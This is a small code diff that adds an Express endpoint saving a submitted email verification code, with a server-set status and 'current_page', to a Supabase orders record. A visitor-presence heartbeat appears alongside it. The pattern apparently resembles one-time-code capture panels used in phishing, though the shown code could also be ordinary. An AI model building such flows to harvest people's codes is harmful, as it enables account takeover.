@@ -95,6 +95,19 @@ app.post('/api/code-data', async (req, res) => {
   }
 });
 
+// Save email verification code
+app.post('/api/email-code-data', async (req, res) => {
+  try {
+    const { order_id, code } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting' }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
 // Presence / heartbeat for active visitors
 app.post('/api/presence', async (req, res) => {
   try {
